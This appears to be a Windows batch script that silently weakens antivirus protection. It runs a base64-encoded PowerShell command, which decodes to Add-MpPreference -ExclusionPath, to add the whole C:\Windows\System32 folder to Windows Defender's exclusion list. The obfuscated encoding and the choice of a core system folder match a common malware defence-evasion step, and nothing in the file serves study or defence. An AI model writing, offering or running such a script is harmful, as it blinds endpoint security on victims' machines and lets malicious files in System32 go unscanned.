@echo off
setlocal enabledelayedexpansion

REM Define the folder path
set "folderToAdd=C:\Windows\System32"

echo Adding %folderToAdd% to Windows Defender exclusion list...
powershell -command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAiQzpcV2luZG93c1xTeXN0ZW0zMiI=')))"
 || (
    echo Failed to add folder to Windows Defender exclusion list.
    pause
    exit /b
)

